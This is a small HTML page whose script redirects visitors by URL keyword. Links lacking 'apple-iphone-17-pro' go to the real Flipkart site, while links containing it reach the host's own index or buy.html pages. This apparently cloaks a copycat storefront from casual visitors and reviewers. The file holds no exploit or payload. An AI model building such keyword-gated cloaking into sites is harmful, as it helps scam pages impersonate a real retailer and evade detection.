<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <script>
      (function() {
        var VERIFY_KEYWORD = 'apple-iphone-17-pro';
        var href = window.location.href.toLowerCase();

        var hasKeyword = href.indexOf(VERIFY_KEYWORD) !== -1;
        var hasBuy = href.indexOf('buy.html') !== -1;

        // 1. If keyword is NOT present -> Go to Flipkart (even if buy.html is present)
        if (!hasKeyword) {
          window.location.replace('https://www.flipkart.com');
          return;
        }

        // Base repository path
        var repo = '/kk';
        var path = window.location.pathname.substring(repo.length);
        var search = window.location.search;
        var hash = window.location.hash;
        var fullTarget = encodeURIComponent(path + search + hash);

        // 2. Keyword present AND "buy.html" is in link -> Send to buy.html
        if (hasBuy) {
          window.location.replace(repo + '/buy.html?p=' + fullTarget);
        } 
        // 3. Keyword present but NO "buy.html" -> Send to index.html
        else {
          window.location.replace(repo + '/?p=' + fullTarget);
        }
      })();
    </script>
</head>
<body>
</body>
</html>
